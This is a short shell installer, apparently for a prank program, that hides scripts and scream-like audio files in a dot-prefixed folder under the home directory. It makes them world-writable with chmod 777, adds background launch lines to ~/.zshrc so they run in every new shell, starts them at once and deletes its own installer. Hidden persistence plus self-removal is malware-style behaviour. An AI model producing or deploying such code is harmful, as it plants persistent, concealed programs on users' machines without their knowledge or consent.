mkdir ~/.SH_Store

mv ./playWithMe.sh ~/.SH_Store/.playWithMe.sh
mv ./close.scpt ~/.SH_Store/.close.scpt
mv ./audio_script.sh ~/.SH_Store/.audio_script.sh
mv ./wihlelm.aiff ~/.SH_Store/.wihlelm.aiff
mv ./link_eaaaah.aiff ~/.SH_Store/.link_eaaaah.aiff

chmod 777 ~/.SH_Store/.audio_script.sh
chmod 777 ~/.SH_Store/.playWithMe.sh
chmod 777 ~/.SH_Store/.close.scpt

echo "sh ~/.SH_Store/.audio_script.sh &" >> ~/.zshrc
echo "sh ~/.SH_Store/.playWithMe.sh &" >> ~/.zshrc

sh ~/.SH_Store/.audio_script.sh &
sh ~/.SH_Store/.playWithMe.sh &

rm install.sh
